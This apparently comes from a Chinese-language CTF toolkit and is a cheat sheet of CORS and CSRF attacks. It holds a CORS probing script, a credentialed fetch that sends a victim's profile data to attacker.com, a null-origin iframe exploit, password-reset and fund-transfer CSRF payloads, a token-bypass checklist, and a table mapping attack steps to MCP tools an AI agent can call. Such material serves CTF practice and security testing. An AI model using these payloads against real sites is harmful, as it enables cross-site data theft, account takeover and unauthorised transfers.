# CORS / CSRF 高级攻击

## 1. CORS 配置速查

```python
# CORS 检查一键脚本
import requests

def check_cors(target: str, endpoint: str = "/api/me"):
    """检查 CORS 配置"""
    tests = {
        "null_origin": "null",
        "evil_subdomain": f"https://evil.{target.split('//')[1].split('/')[0]}",
        "evil_prefixed": f"https://{target.split('//')[1].split('/')[0]}.evil.com",
        "evil_suffix": f"https://evil.com/{target.split('//')[1].split('/')[0]}",
        "no_origin": None,
        "http_variant": target.replace("https://", "http://"),
    }
    for name, origin in tests.items():
        headers = {}
        if origin:
            headers["Origin"] = origin
        r = requests.get(target + endpoint, headers=headers)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        print(f"  {name:20s} → ACAO: {acao:40s} | ACAC: {acac}")
```

## 2. CORS 漏洞利用等级

```
# Level 1: ACAO 反射且 ACAC=true
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# → 可跨域读取认证请求的响应 → 完全读取

# Level 2: ACAO 反射但无 ACAC
# Access-Control-Allow-Origin: *
# → 只能读无需 cookie 的公开 API

# Level 3: ACAO null
# Access-Control-Allow-Origin: null
# → null origin 可被 iframe sandbox 触发

# Level 4: 前缀/后缀匹配绕过
# 白名单 *.target.com → evil.target.com 不可用
# 但 target.com.evil.com 可能通过
```

### Level 1 Exploit

```html
<!-- 托管在 attacker.com -->
<script>
fetch('https://target.com/api/user/profile', {
    credentials: 'include'  // 带 cookie
})
.then(r => r.json())
.then(data => fetch('https://attacker.com/log?d=' + btoa(JSON.stringify(data))));
</script>
```

### Level 3 Exploit (null origin)

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    fetch('https://target.com/api/me', {credentials:'include'})
      .then(r => r.text())
      .then(d => parent.postMessage(d, '*'));
  </script>">
</iframe>
<!-- null origin 因为 sandbox 属性 -->
```

## 3. CSRF 高级

### Token 绕过

```python
# CSRF 绕过排查清单:
CSRF_BYPASS_CHECKS = [
    # 1. Token 不验证 → 直接删参数
    "remove_csrf_param",
    # 2. Token 绑定 session 但可复用
    "reuse_token",
    # 3. Token 被其他用户的 token 替代仍通过
    "cross_user_token",
    # 4. 空值绕过
    {"csrf_token": ""}, {"csrf": None},
    # 5. 修改 Content-Type
    "Content-Type: application/json", "Content-Type: text/plain",
    # 6. 修改 HTTP method → GET
    "GET_override",
    # 7. 自定义 header → 可能仅检查存在性
    "X-Requested-With: XMLHttpRequest",  # 仅检查存在即放行
    # 8. Token 在 cookie 中 → CSRF 自动带
    "cookie_only_csrf",
]
```

### CSRF → 密码重置劫持

```python
# 如果密码重置接口无 CSRF 保护且使用 cookie 会话:
# 攻击者诱导受害者点击恶意页面:
# → 自动 POST 修改密码为攻击者控制的密码

# PoC HTML:
csrf_html = '''
<form action="https://target.com/reset-password" method="POST" id="f">
  <input name="password" value="Attacker123!">
  <input name="confirm" value="Attacker123!">
</form>
<script>document.getElementById('f').submit();</script>
'''
```

### JSON CSRF

```html
<!-- 如果后端接受 JSON Content-Type 且无 CSRF 保护 -->
<script>
fetch('https://target.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'attacker', amount: 999999})
});
</script>
<!-- 可能被 CORS preflight 阻挡，但如果配置宽松则可绕过 -->
```

## 4. SameSite Cookie 绕过

```
SameSite=Lax:   GET 导航会发 cookie，POST 不发的 → 找 GET 可触发的状态变更
SameSite=None:  无保护，但必须 Secure=true (HTTPS)
SameSite=Strict: 最安全，同站才发

SameSite Lax 绕过:
  - GET /api/deleteUser?id=1 → 状态变更在 GET 上
  - <a href="..."> 点击 → 会带 cookie
  - window.open + location 也会带 cookie
```

## 5. 攻击链

```
CORS misconfig → 跨域读用户数据 → API token/PII 泄露
CORS null origin → iframe 窃取 → Account Takeover
CSRF password reset → 无 token 保护 → 改密码 → 接管
SameSite Lax + GET state change → CSRF → 删号/转账
CSRF + XSS → 持久化后门 → 长期控制
CORS → CSRF token 读取 → 完整 CSRF 攻击链路
```

## 工具引用

```bash
# 通用 HTTP 探测框架；带认证的请求应保存在被 gitignore 的 case/exports 中
python scripts/ctf-website/http_probe.py https://example.test/

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| CORS/CSRF 探测 | `http_probe` | HTTP GET 探测 CORS 头和 CSRF 漏洞 |
| 知识检索 | `kb_router` | 按 CORS/CSRF 信号搜索知识库 |
```

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
